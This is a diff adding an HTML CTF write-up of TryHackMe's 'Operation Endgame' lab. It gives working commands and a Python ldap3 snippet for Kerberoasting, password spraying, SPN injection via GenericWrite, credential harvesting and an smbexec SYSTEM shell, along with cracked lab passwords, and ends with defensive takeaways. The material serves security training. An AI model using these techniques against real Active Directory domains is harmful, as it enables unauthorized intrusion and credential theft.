@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Operation Endgame (TryHackMe) - CTF Write-up</title>
+    <meta name="description" content="CTF write-up for the Operation Endgame challenge from TryHackMe. Full Active Directory domain compromise: Kerberoasting, password spraying, ACL abuse, targeted Kerberoasting, credential harvesting, and privilege escalation to SYSTEM.">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../css/style.css">
+
+    <style>
+        .writeup-container {
+            max-width: 800px;
+            margin: 120px auto 50px auto;
+            padding: 40px;
+        }
+        h1, h2, h3 {
+            color: var(--primary-color, #00ffcc);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-top: 0;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: var(--text-color, #ffffff);
+        }
+        ul, ol {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary-color, #00ffcc);
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        blockquote {
+            border-left: 4px solid var(--primary-color, #00ffcc);
+            padding-left: 20px;
+            font-style: italic;
+            margin-bottom: 25px;
+            opacity: 0.8;
+            color: var(--text-color, #ffffff);
+        }
+        .flag-box {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary-color, #00ffcc);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            color: var(--primary-color, #00ffcc);
+            text-align: center;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table td:first-child {
+            font-weight: 600;
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 140px;
+        }
+        .step-label {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary-color, #00ffcc);
+            background: var(--primary-glow);
+            padding: 4px 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .success-box {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .denied-box {
+            background: rgba(255, 50, 50, 0.08);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #ff6b6b;
+        }
+        .takeaway-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .takeaway-card h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        .takeaway-card p {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+        }
+        .chain-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            border-radius: 4px;
+            background: rgba(0, 255, 204, 0.08);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            color: var(--primary-color, #00ffcc);
+        }
+        .chain-arrow {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .flag-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        .cred-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 25px;
+        }
+        .cred-table th {
+            text-align: left;
+            padding: 10px 15px;
+            border-bottom: 2px solid var(--primary-color, #00ffcc);
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+        .cred-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+            font-size: 0.9rem;
+        }
+        .cred-table code {
+            font-size: 0.85em;
+        }
+    </style>
+</head>
+<body class="dark-theme">
+    <header>
+        <nav id="navbar" style="background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(10px);">
+            <div class="logo">OMAR</div>
+            <ul class="nav-links">
+                <li><a href="./">&larr; All Write-ups</a></li>
+                <li><a href="../index.html" class="btn">Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="writeup-container glass">
+        <h1>CTF Write-up: Operation Endgame</h1>
+
+        <table class="meta-table">
+            <tr><td>Platform</td><td>TryHackMe</td></tr>
+            <tr><td>Category</td><td>🖥️ Active Directory</td></tr>
+            <tr><td>Difficulty</td><td>Hard</td></tr>
+            <tr><td>Tags</td><td>Kerberoasting · Password Spraying · ACL Abuse · GenericWrite · Targeted Kerberoasting · Credential Harvesting · SMBExec</td></tr>
+            <tr><td>Target</td><td><code>10.49.191.237</code> — Windows Server 2019 (Build 17763)</td></tr>
+            <tr><td>Domain</td><td><code>thm.local</code> (DC: <code>ad.thm.local</code>)</td></tr>
+            <tr><td>Result</td><td>✅ Domain compromise &rarr; SYSTEM shell &rarr; Flag captured</td></tr>
+        </table>
+
+        <h2>Challenge Overview</h2>
+        <p><strong>Objective:</strong> Starting from an unauthenticated position, achieve full domain compromise on an Active Directory Domain Controller and recover the administrator flag.</p>
+        <blockquote>
+            This engagement demonstrates how a single enabled guest account can cascade into complete domain compromise when compounded by password reuse, overly permissive ACLs, and hardcoded credentials in automation scripts.
+        </blockquote>
+
+        <h3>Attack Chain</h3>
+        <div class="attack-chain">
+            <span class="chain-step">Guest (No Creds)</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">Kerberoasting</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">CODY_ROY</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">Password Spray</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">ZACHARY_HUNT</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">BloodHound ACL</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">Targeted Kerberoast</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">JERRI_LANCASTER</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">RDP + Cred Harvest</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">SANFORD_DAUGHERTY</span>
+            <span class="chain-arrow">&rarr;</span>
+            <span class="chain-step">🚩 SYSTEM</span>
+        </div>
+
+        <h2>Methodology</h2>
+
+        <!-- STEP 1: Reconnaissance -->
+        <h3><span class="step-label">STEP 1</span> Reconnaissance</h3>
+        <p>A full TCP scan with service and script detection was performed against the target to enumerate the attack surface:</p>
+        <pre>nmap -Pn -sC -sV -p- --min-rate 2000 10.49.191.237</pre>
+        <ul>
+            <li><code>-Pn</code> — Skips host discovery (treats the host as online).</li>
+            <li><code>-sC</code> — Runs Nmap's default NSE scripts for additional enumeration.</li>
+            <li><code>-sV</code> — Probes open ports to determine running services and versions.</li>
+            <li><code>-p-</code> — Scans all 65,535 TCP ports.</li>
+            <li><code>--min-rate 2000</code> — Ensures a minimum packet rate for faster scanning.</li>
+        </ul>
+        <p>The scan revealed an extensive service profile consistent with an Active Directory Domain Controller:</p>
+        <ul>
+            <li><strong>Ports 53, 88</strong> — DNS and Kerberos (core AD services).</li>
+            <li><strong>Ports 135, 139, 445</strong> — RPC, NetBIOS, and SMB (Windows networking stack).</li>
+            <li><strong>Ports 389, 636, 3268, 3269</strong> — LDAP, LDAPS, and Global Catalog (directory services).</li>
+            <li><strong>Port 443</strong> — IIS 10.0 serving a default page.</li>
+            <li><strong>Port 3389</strong> — RDP (Remote Desktop Protocol).</li>
+        </ul>
+        <p>The LDAP banner disclosed the domain name <code>thm.local</code>, the RDP certificate confirmed the hostname <code>AD</code>, and SMB signing was enabled.</p>
+        <div class="success-box">
+            ✓ Target confirmed as an Active Directory Domain Controller — thm.local (ad.thm.local).
+        </div>
+
+        <!-- STEP 2: Service Enumeration -->
+        <h3><span class="step-label">STEP 2</span> Service Enumeration</h3>
+        <p><strong>SMB — Guest Authentication:</strong> Anonymous and guest access were tested against SMB shares:</p>
+        <pre>netexec smb 10.49.191.237 -u guest -p "" --shares</pre>
+        <p>Guest authentication succeeded. Only <code>IPC$</code> was readable — sufficient for RPC-based enumeration but no direct file-level access was exposed.</p>
+
+        <p><strong>LDAP — Anonymous Bind:</strong> Anonymous LDAP binding was permitted, enabling a full directory dump without any credentials:</p>
+        <pre>ldapsearch -x -H ldap://10.49.191.237 -b "dc=thm,dc=local" \
+  "(objectClass=person)" sAMAccountName</pre>
+        <p>This returned approximately <strong>600 user accounts</strong>, organised into two distinct categories:</p>
+        <ul>
+            <li><strong>Standard users</strong> — <code>FIRSTNAME_LASTNAME</code> naming convention (e.g., <code>CODY_ROY</code>, <code>ZACHARY_HUNT</code>).</li>
+            <li><strong>Service accounts</strong> — Numeric identifiers suffixed with <code>SA</code> (e.g., <code>8429491684SA</code>), organised within a tiered OU hierarchy (<code>Tier 0 / Tier 1 / Tier 2</code>), with Tier 0 representing the highest privilege level.</li>
+        </ul>
+
+        <p><strong>SPN Discovery:</strong> Querying the <code>servicePrincipalName</code> attribute across all user objects revealed a user-owned SPN:</p>
+        <pre>CODY_ROY → HTTP/server.secure.com</pre>
+        <p>A user account with a registered SPN is vulnerable to <strong>Kerberoasting</strong> — any authenticated domain principal (including <code>guest</code>) can request a Ticket-Granting Service (TGS) ticket encrypted with the user's password hash, which can then be cracked offline.</p>
+        <div class="success-box">
+            ✓ Kerberoastable target identified — CODY_ROY with SPN HTTP/server.secure.com.
+        </div>
+
+        <!-- STEP 3: Kerberoasting -->
+        <h3><span class="step-label">STEP 3</span> Initial Access — Kerberoasting</h3>
+        <p>Using the guest account (no password required), I requested TGS tickets for all SPN-bearing user accounts:</p>
+        <pre>impacket-GetUserSPNs thm.local/guest:'' \
+  -dc-ip 10.49.191.237 -no-pass -request</pre>
+        <p>The returned <code>$krb5tgs$23$</code> hash for <code>CODY_ROY</code> was extracted and cracked against the <code>rockyou.txt</code> wordlist:</p>
+        <pre>john cody_roy.hash --wordlist=rockyou.txt --format=krb5tgs
+
+MKO)mko0         (?)</pre>
+        <div class="success-box">
+            ✓ Credential obtained — CODY_ROY : MKO)mko0 (member of Remote Desktop Users).
+        </div>
+
+        <!-- STEP 4: Password Spraying -->
+        <h3><span class="step-label">STEP 4</span> Lateral Movement — Password Spraying</h3>
+        <p>To test for password reuse across the domain, I first compiled a comprehensive user list using <code>CODY_ROY</code>'s authenticated session:</p>
+        <pre>netexec ldap 10.49.191.237 -u CODY_ROY -p 'MKO)mko0' --users</pre>
+        <p>The password <code>MKO)mko0</code> was then sprayed against all <strong>489 domain accounts</strong>:</p>
+        <pre>netexec smb 10.49.191.237 -u users.txt -p 'MKO)mko0' \
+  --continue-on-success</pre>
+        <p>Two accounts authenticated successfully:</p>
+        <pre>[+] thm.local\CODY_ROY:MKO)mko0
+[+] thm.local\ZACHARY_HUNT:MKO)mko0</pre>
+        <div class="success-box">
+            ✓ Password reuse confirmed — ZACHARY_HUNT : MKO)mko0.
+        </div>
+
+        <!-- STEP 5: BloodHound -->
+        <h3><span class="step-label">STEP 5</span> ACL Analysis — BloodHound</h3>
+        <p>To map privilege-escalation paths, I collected full Active Directory graph data using <code>ZACHARY_HUNT</code>'s credentials:</p>
+        <pre>bloodhound-python -u 'ZACHARY_HUNT@thm.local' -p 'MKO)mko0' \
+  -d thm.local -ns 10.49.191.237 --dns-timeout 5 -c All --zip</pre>
+        <p>Parsing the BloodHound JSON output for outbound ACL edges from <code>ZACHARY_HUNT</code> revealed a critical privilege-escalation path:</p>
+        <pre>ZACHARY_HUNT@THM.LOCAL → GenericWrite → JERRI_LANCASTER@THM.LOCAL</pre>
+        <p><strong>GenericWrite</strong> on a user object grants the ability to modify arbitrary writable attributes — including <code>servicePrincipalName</code>. This enables <strong>targeted Kerberoasting</strong>: an attacker can inject a fake SPN onto the victim, request a TGS ticket encrypted with their password hash, crack it offline, and then remove the SPN.</p>
+        <div class="success-box">
+            ✓ Privilege escalation path identified — ZACHARY_HUNT has GenericWrite over JERRI_LANCASTER.
+        </div>
+
+        <!-- STEP 6: Targeted Kerberoasting -->
+        <h3><span class="step-label">STEP 6</span> Targeted Kerberoasting via ACL Abuse</h3>
+        <p><strong>SPN Injection:</strong> Using <code>ZACHARY_HUNT</code>'s GenericWrite permission, I injected a temporary SPN onto <code>JERRI_LANCASTER</code>'s account via an <code>ldap3</code> session:</p>
+        <pre>from ldap3 import Server, Connection, MODIFY_ADD, MODIFY_DELETE
+
+conn = Connection(
+    Server("10.49.191.237"),
+    user="ZACHARY_HUNT@thm.local",
+    password="MKO)mko0",
+    authentication="SIMPLE"
+)
+conn.bind()
+
+target_dn = "CN=JERRI_LANCASTER,OU=...,DC=thm,DC=local"
+conn.modify(target_dn, {
+    "servicePrincipalName": [(MODIFY_ADD, ["HTTP/endgame.thm.local"])]
+})</pre>
+
+        <p><strong>TGS Request &amp; Offline Cracking:</strong> With the SPN now set, I requested the TGS ticket and cracked it:</p>
+        <pre>impacket-GetUserSPNs 'thm.local/ZACHARY_HUNT:MKO)mko0' \
+  -dc-ip 10.49.191.237 -request</pre>
+        <p>This also surfaced a second Kerberoastable account — <code>CHRISTIAN_SANFORD</code> — with legitimate SPNs (<code>HTTP/server.thm.local</code>, <code>HTTP/server.example.com</code>). Both hashes were submitted for cracking:</p>
+        <pre>john jerri_hashes.txt --wordlist=rockyou.txt --format=krb5tgs
+
+lovinlife!       (?)  ← JERRI_LANCASTER
+MKO)mko0         (?)  ← CODY_ROY (already known)</pre>
+        <p>The <code>CHRISTIAN_SANFORD</code> hash did not crack with <code>rockyou.txt</code> — not needed for the attack path.</p>
+
+        <p><strong>Cleanup:</strong> The temporary SPN was removed to restore the directory to its original state:</p>
+        <pre>conn.modify(target_dn, {
+    "servicePrincipalName": [(MODIFY_DELETE, ["HTTP/endgame.thm.local"])]
+})</pre>
+        <div class="success-box">
+            ✓ Credential obtained — JERRI_LANCASTER : lovinlife! (Remote Desktop Users, Reader Admins).
+        </div>
+
+        <!-- STEP 7: RDP & Credential Harvesting -->
+        <h3><span class="step-label">STEP 7</span> RDP Access &amp; Credential Harvesting</h3>
+        <p><code>JERRI_LANCASTER</code> is a member of <strong>Remote Desktop Users</strong>, providing GUI access to the domain controller:</p>
+        <pre>xfreerdp /v:10.49.191.237 /u:JERRI_LANCASTER /p:'lovinlife!' \
+  /cert:ignore /dynamic-resolution /size:1600x1000 \
+  /drive:share,/tmp/opencode/rdp_share</pre>
+        <p>Two data-exfiltration channels were established for the session:</p>
+        <ul>
+            <li><strong>Shared drive</strong> (<code>/drive:share,...</code>) — for bidirectional file transfer.</li>
+            <li><strong>Clipboard redirection</strong> — command output piped to <code>clip</code> was accessible from the attacking host.</li>
+        </ul>
+        <p>Enumeration of the <code>C:\Scripts</code> directory revealed an automation script containing <strong>hardcoded domain credentials</strong>:</p>
+        <pre># C:\Scripts\syncer.ps1
+$Username = "SANFORD_DAUGHERTY"
+$Password = ConvertTo-SecureString "RESET_ASAP123" -AsPlainText -Force</pre>
+        <div class="success-box">
+            ✓ Plaintext credentials harvested from syncer.ps1 — SANFORD_DAUGHERTY : RESET_ASAP123.
+        </div>
+
+        <!-- STEP 8: Privilege Escalation -->
+        <h3><span class="step-label">STEP 8</span> Privilege Escalation &mdash; SYSTEM</h3>
+        <p>The harvested credentials were validated against SMB:</p>
+        <pre>netexec smb 10.49.191.237 -u 'SANFORD_DAUGHERTY' -p 'RESET_ASAP123'
+
+[+] thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 (Pwn3d!)</pre>
+        <p>The <code>(Pwn3d!)</code> indicator confirmed <strong>local administrator</strong> privileges, with <code>READ</code> and <code>WRITE</code> access to <code>C$</code> and <code>ADMIN$</code> administrative shares.</p>
+        <p>A SYSTEM-level shell was obtained via Impacket's <code>smbexec</code>, which leverages the Windows Service Control Manager for code execution:</p>
+        <pre>impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@10.49.191.237'
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\flag.txt.txt
+THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}</pre>
+
+        <div class="flag-label">FLAG</div>
+        <div class="flag-box">
+            🚩 THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
+        </div>
+
+        <h2>Credentials Summary</h2>
+        <table class="cred-table">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Account</th>
+                    <th>Password</th>
+                    <th>Source</th>
+                    <th>Privileges</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1</td>
+                    <td><code>CODY_ROY</code></td>
+                    <td><code>MKO)mko0</code></td>
+                    <td>Kerberoasting (guest)</td>
+                    <td>Remote Desktop Users</td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td><code>ZACHARY_HUNT</code></td>
+                    <td><code>MKO)mko0</code></td>
+                    <td>Password spray</td>
+                    <td>GenericWrite over JERRI_LANCASTER</td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td><code>JERRI_LANCASTER</code></td>
+                    <td><code>lovinlife!</code></td>
+                    <td>Targeted Kerberoasting</td>
+                    <td>Remote Desktop Users, Reader Admins</td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td><code>SANFORD_DAUGHERTY</code></td>
+                    <td><code>RESET_ASAP123</code></td>
+                    <td>Hardcoded in syncer.ps1</td>
+                    <td>Local Administrator</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2>Key Takeaways</h2>
+
+        <div class="takeaway-card">
+            <h4>🔓 Disable Guest-Account Kerberos Authentication</h4>
+            <p>The guest account — requiring no password — was sufficient to request TGS tickets and Kerberoast user-owned SPNs. Guest accounts should be disabled entirely or, at minimum, restricted from Kerberos authentication via Group Policy. This single misconfiguration provided the initial foothold for the entire attack chain.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🔑 Enforce Unique Passwords and Deploy MFA</h4>
+            <p>Password reuse between <code>CODY_ROY</code> and <code>ZACHARY_HUNT</code> enabled lateral movement from a single cracked hash to a second account with elevated ACL permissions. Unique password enforcement, a banned-password list blocking common patterns, and Multi-Factor Authentication would have contained the blast radius of the initial compromise.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🛡️ Audit and Trim Excessive ACL Permissions</h4>
+            <p><code>GenericWrite</code> on a user object enabled targeted Kerberoasting — the ability to inject an SPN, request a TGS, and crack the password offline. DACLs should be audited regularly using tools like BloodHound or PingCastle, and SPN modifications should be monitored via Windows Event ID 4742 (computer account modification) and custom detections on attribute changes.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>📜 Never Store Credentials in Automation Scripts</h4>
+            <p>The <code>syncer.ps1</code> script contained plaintext domain credentials for a local administrator account. Any user with read access to <code>C:\Scripts</code> could harvest them. Secrets should be managed through a dedicated vault (Azure Key Vault, HashiCorp Vault) or Group Managed Service Accounts (gMSA), which eliminate the need for password storage entirely.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>📂 Restrict Anonymous LDAP Binding</h4>
+            <p>Anonymous LDAP access enabled full directory enumeration — including user accounts, group memberships, and SPNs — without any credentials. Anonymous binding should be disabled via the <code>dsHeuristics</code> attribute, and LDAP signing and channel binding should be enforced to prevent unauthenticated reconnaissance.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🔐 Enforce Strong Password Policies</h4>
+            <p>Both Kerberoasted passwords (<code>MKO)mko0</code> and <code>lovinlife!</code>) cracked in seconds against the standard <code>rockyou.txt</code> wordlist. A minimum password length of 14+ characters, combined with a password filter blocking common dictionary words, would have rendered the Kerberoasting attacks ineffective even if the TGS tickets were successfully obtained.</p>
+        </div>
+
+    </main>
+</body>
+</html>
